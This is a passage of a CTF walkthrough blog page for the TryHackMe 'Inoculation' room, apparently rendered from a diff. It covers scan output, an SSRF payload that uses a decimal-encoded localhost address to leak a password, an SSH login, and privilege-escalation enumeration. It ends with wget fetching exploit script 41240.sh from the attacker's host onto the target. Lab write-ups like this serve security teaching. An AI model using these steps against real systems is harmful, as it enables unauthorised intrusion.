+</span></span><span class=line><span class=cl>|       HTTPD:A5773ECB3CB67826707B252F21BB80BB  4.3     https://vulners.com/httpd/HTTPD:A5773ECB3CB67826707B252F21BB80BB
+</span></span><span class=line><span class=cl>|       HTTPD:86C509FC37A85DC3C01E3CE10402C6DC  4.3     https://vulners.com/httpd/HTTPD:86C509FC37A85DC3C01E3CE10402C6DC
+</span></span><span class=line><span class=cl>|       HTTPD:714A18409AEB3B8362DC4FA2B923CA7A  4.3     https://vulners.com/httpd/HTTPD:714A18409AEB3B8362DC4FA2B923CA7A
+</span></span><span class=line><span class=cl>|       HTTPD:43E63F90DCA6F418ACF2327C4F88C3D8  4.3     https://vulners.com/httpd/HTTPD:43E63F90DCA6F418ACF2327C4F88C3D8
+</span></span><span class=line><span class=cl>|       HTTPD:2E568217BC35E0AA91DF49E7CE65CA67  3.5     https://vulners.com/httpd/HTTPD:2E568217BC35E0AA91DF49E7CE65CA67
+</span></span><span class=line><span class=cl>|       HTTPD:B6CF5630624F83951A477D36DC8FD634  0.0     https://vulners.com/httpd/HTTPD:B6CF5630624F83951A477D36DC8FD634
+</span></span><span class=line><span class=cl>|       HTTPD:94C27BCF50CA81A222019B9F06735AA1  0.0     https://vulners.com/httpd/HTTPD:94C27BCF50CA81A222019B9F06735AA1
+</span></span><span class=line><span class=cl>|       HTTPD:914D0BB6DF64CDA58BDF1461563DCBC2  0.0     https://vulners.com/httpd/HTTPD:914D0BB6DF64CDA58BDF1461563DCBC2
+</span></span><span class=line><span class=cl>|       HTTPD:7ED2E94FC8175AF57B0B84C966E78986  0.0     https://vulners.com/httpd/HTTPD:7ED2E94FC8175AF57B0B84C966E78986
+</span></span><span class=line><span class=cl>|       HTTPD:55F8C86BB4FE80544B301C6F772E1F21  0.0     https://vulners.com/httpd/HTTPD:55F8C86BB4FE80544B301C6F772E1F21
+</span></span><span class=line><span class=cl>|       HTTPD:53F7D531D201D0209EE31F3FA8829F5B  0.0     https://vulners.com/httpd/HTTPD:53F7D531D201D0209EE31F3FA8829F5B
+</span></span><span class=line><span class=cl>|_      HTTPD:21A860C56B7B6A55960FB17E72B7E4B4  0.0     https://vulners.com/httpd/HTTPD:21A860C56B7B6A55960FB17E72B7E4B4
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/5%OT=22%CT=1%CU=42760%PV=Y%DS=2%DC=T%G=Y%TM=5F7B59D
+</span></span><span class=line><span class=cl>OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS(
+</span></span><span class=line><span class=cl>OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
+</span></span><span class=line><span class=cl>OS:NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+</span></span><span class=line><span class=cl>OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+</span></span><span class=line><span class=cl>OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+</span></span><span class=line><span class=cl>OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+</span></span><span class=line><span class=cl>OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+</span></span><span class=line><span class=cl>OS:S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 199/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   34.94 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   35.17 ms 10.10.153.127
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 404.17 seconds
+</span></span></code></pre></td></tr></table></div></div><ul><li><a href=http://10.10.153.127/>http://10.10.153.127/</a></li><li><a href=http://10.10.153.127/testhook.php>http://10.10.153.127/testhook.php</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Inoculation$ nikto -h 10.10.153.127- Nikto v2.1.6
+</span></span><span class=line><span class=cl>---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>+ Target IP:          10.10.153.127
+</span></span><span class=line><span class=cl>+ Target Hostname:    10.10.153.127
+</span></span><span class=line><span class=cl>+ Target Port:        80
+</span></span><span class=line><span class=cl>+ Start Time:         2020-10-05 19:39:50 (GMT2)
+</span></span><span class=line><span class=cl>---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>+ Server: Apache/2.4.18 (Ubuntu)
+</span></span><span class=line><span class=cl>+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class=line><span class=cl>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class=line><span class=cl>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+</span></span><span class=line><span class=cl>+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)
+</span></span><span class=line><span class=cl>+ Server may leak inodes via ETags, header found with file /, inode: 430, size: 5916605783d6d, mtime: gzip
+</span></span><span class=line><span class=cl>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+</span></span><span class=line><span class=cl>+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+</span></span><span class=line><span class=cl>+ OSVDB-3233: /icons/README: Apache default file found.
+</span></span><span class=line><span class=cl>+ 7890 requests: 0 error(s) and 7 item(s) reported on remote host
+</span></span><span class=line><span class=cl>+ End Time:           2020-10-05 19:45:56 (GMT2) (366 seconds)
+</span></span><span class=line><span class=cl>---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>+ 1 host(s) tested
+</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=2020-10-05_20-16.png alt></p><p><img loading=lazy src=2020-10-05_20-17.png alt></p><ul><li><a href=https://stackoverflow.com/questions/2241229/going-from-127-0-0-1-to-2130706433-and-back-again>Going from 127.0.0.1 to 2130706433, and back again</a></li></ul><p><code>handler=http%3A%2F%2F2130706433%3A§</code></p><p><img loading=lazy src=2020-10-05_20-19.png alt></p><p><img loading=lazy src=2020-10-05_20-26.png alt></p><p><code>http://127.0.0.1:9999/pass4maynard.txt</code></p><p>Username: <code>maynard</code></p><p><img loading=lazy src=2020-10-05_20-21.png alt></p><p><code>Here is your password: Js&amp;S_uFJgg~YM4_g\n</code></p><p><code>Js&amp;S_uFJgg~YM4_g</code></p><ol><li>User Flag?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Inoculation$ ssh maynard@10.10.153.127
+</span></span><span class=line><span class=cl>The authenticity of host &#39;10.10.153.127 (10.10.153.127)&#39; can&#39;t be established.
+</span></span><span class=line><span class=cl>ECDSA key fingerprint is SHA256:uvVRz1YTEzN+fnnk2hDshR+Pl18TZzbGGRIH6dRtdL8.
+</span></span><span class=line><span class=cl>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span><span class=line><span class=cl>Warning: Permanently added &#39;10.10.153.127&#39; (ECDSA) to the list of known hosts.
+</span></span><span class=line><span class=cl>maynard@10.10.153.127&#39;s password:
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maynard@inoculation:~$ ls
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>maynard@inoculation:~$ cat user.txt
+</span></span><span class=line><span class=cl>e7cdb6964dd72a0ef9a934e111d3ed65
+</span></span><span class=line><span class=cl>maynard@inoculation:~$
+</span></span></code></pre></td></tr></table></div></div><p><code>e7cdb6964dd72a0ef9a934e111d3ed65</code></p><ol start=2><li>Root Flag?</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[+] Searching ssl/ssh files
+</span></span><span class=line><span class=cl>Port 22
+</span></span><span class=line><span class=cl>PermitRootLogin yes
+</span></span><span class=line><span class=cl>PubkeyAuthentication yes
+</span></span><span class=line><span class=cl>PermitEmptyPasswords no
+</span></span><span class=line><span class=cl>ChallengeResponseAuthentication no
+</span></span><span class=line><span class=cl>UsePAM yes
+</span></span><span class=line><span class=cl>Possible private SSH keys were found!
+</span></span><span class=line><span class=cl>/home/maynard/.config/lxc/client.key
+</span></span><span class=line><span class=cl> --&gt; /etc/hosts.allow file found, read the rules:
+</span></span><span class=line><span class=cl>/etc/hosts.allow
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>====================================( Interesting Files )=====================================
+</span></span><span class=line><span class=cl>[+] SUID - Check easy privesc, exploits and write perms
+</span></span><span class=line><span class=cl>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+</span></span><span class=line><span class=cl>/usr/bin/chfn  ---&gt;  SuSE_9.3/10
+</span></span><span class=line><span class=cl>/usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+</span></span><span class=line><span class=cl>/usr/bin/newuidmap
+</span></span><span class=line><span class=cl>/usr/bin/newgidmap
+</span></span><span class=line><span class=cl>/usr/bin/gpasswd
+</span></span><span class=line><span class=cl>/usr/bin/chsh
+</span></span><span class=line><span class=cl>/usr/bin/at  ---&gt;  RTru64_UNIX_4.0g(CVE-2002-1614)
+</span></span><span class=line><span class=cl>/usr/bin/pkexec  ---&gt;  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+</span></span><span class=line><span class=cl>/usr/bin/newgrp  ---&gt;  HP-UX_10.20
+</span></span><span class=line><span class=cl>/usr/bin/sudo  ---&gt;  /sudo$
+</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
+</span></span><span class=line><span class=cl>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span class=line><span class=cl>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span class=line><span class=cl>/usr/lib/snapd/snap-confine
+</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>/bin/umount  ---&gt;  BSD/Linux(08-1996)
+</span></span><span class=line><span class=cl>/bin/ping6
+</span></span><span class=line><span class=cl>/bin/su
+</span></span><span class=line><span class=cl>/bin/fusermount
+</span></span><span class=line><span class=cl>/bin/ntfs-3g  ---&gt;  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+</span></span><span class=line><span class=cl>/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+</span></span><span class=line><span class=cl>/bin/ping
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+</span></span><span class=line><span class=cl>[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 2188 Aug 31  2015 /etc/bash.bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
+</span></span><span class=line><span class=cl>./linpeas.sh: 2490: [: /etc/systemd/system/timers.target.wants/snapd.snap-repair.timer: unexpected operator
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 maynard maynard 3771 Aug 31  2019 /home/maynard/.bashrc
+</span></span><span class=line><span class=cl>./linpeas.sh: 2490: [: /home/maynard/.profile: unexpected operator
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 3106 Oct 22  2015 /usr/share/base-files/dot.bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 3161 Apr 14  2016 /usr/share/byobu/profiles/bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 870 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+</span></span><span class=line><span class=cl>-rw-r--r-- 1 root root 1865 Jul  2  2015 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maynard@inoculation:~$ sudo -l
+</span></span><span class=line><span class=cl>sudo: unable to resolve host inoculation
+</span></span><span class=line><span class=cl>Matching Defaults entries for maynard on inoculation:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User maynard may run the following commands on inoculation:
+</span></span><span class=line><span class=cl>    (ALL) NOPASSWD: /sbin/insmod
+</span></span><span class=line><span class=cl>    (ALL) NOPASSWD: /sbin/rmmod
+</span></span><span class=line><span class=cl>maynard@inoculation:~$
+</span></span></code></pre></td></tr></table></div></div><ul><li><a href=https://www.exploit-db.com/exploits/41240>ntfs-3g (Debian 9) - Local Privilege Escalation</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>obj-m +<span class=o>=</span> cve_2017_0358.o
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>all:
+</span></span><span class=line><span class=cl>	make -C /lib/modules/<span class=k>$(</span>shell uname -r<span class=k>)</span>/build <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> modules
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>clean:
+</span></span><span class=line><span class=cl>	make -C /lib/modules/<span class=k>$(</span>shell uname -r<span class=k>)</span>/build <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> clean
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>obj-m +<span class=o>=</span> cve_2017_0358.o
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>all:
+</span></span><span class=line><span class=cl>  make -C /lib/modules/4.15.0-58-generic/build <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> modules
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>clean:
+</span></span><span class=line><span class=cl>  make -C /lib/modules/4.15.0-58-generic/build <span class=nv>M</span><span class=o>=</span><span class=k>$(</span>PWD<span class=k>)</span> clean
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maynard@inoculation:~$ wget http://10.8.106.222/41240.sh
+</span></span><span class=line><span class=cl>--2020-10-05 13:43:16--  http://10.8.106.222/41240.sh
+</span></span><span class=line><span class=cl>Connecting to 10.8.106.222:80... connected.
+</span></span><span class=line><span class=cl>HTTP request sent, awaiting response... 200 OK
+</span></span><span class=line><span class=cl>Length: 16102 (16K) [text/x-sh]
+</span></span><span class=line><span class=cl>Saving to: ‘41240.sh’
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>41240.sh        100%[=====&gt;]  15.72K  --.-KB/s    in 0.04s
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>2020-10-05 13:43:16 (441 KB/s) - ‘41240.sh’ saved [16102/16102]
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maynard@inoculation:~$ chmod +x 41240.sh
+</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
